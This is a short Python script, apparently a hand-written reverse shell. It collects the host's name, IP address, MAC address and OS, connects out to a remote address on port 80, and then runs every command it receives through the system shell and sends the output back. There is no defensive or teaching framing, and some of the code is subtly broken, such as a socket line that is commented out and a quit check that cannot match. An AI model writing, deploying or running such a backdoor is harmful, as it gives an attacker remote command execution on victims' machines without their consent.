# -*- coding: utf-8 -*-

import socket,subprocess
import time
import uuid
import sys
import platform


def get_mac_address():
    mac = uuid.UUID(int=uuid.getnode()).hex[-12:]
    return ":".join([mac[e:e + 2] for e in range(0, 11, 2)])

def IsOpen(ip,port):
    # s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    try:
        s.connect((ip,int(port)))
        s.close()
        print ('%d is open' %port)
        return True
    except:
        print ('%d is down' %port)
        return False

if __name__ == '__main__':
    # get information
    myname = socket.getfqdn(socket.gethostname())
    myaddr = socket.gethostbyname(myname)
    os_name = ("OS: " + platform.platform())
    mache_name = ("主机名：" + myname)
    IP_addr = ("IP: " + myaddr)
    MAC_addr = ("MAC: " + get_mac_address())


    os = platform.platform()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.*.*', 80))

    # for data in [myname,myaddr,os_name,mache_name,IP_addr,MAC_addr]:
    #     s.send(data.encode())
    #     time.sleep(1)
    #     s.send((s.recv(1024)))

    while 1:
        data = s.recv(1024)
        if data == "quit": break
        res = subprocess.Popen(data.decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        cmd_out = res.stdout.read()
        s.send(cmd_out)

    s.close()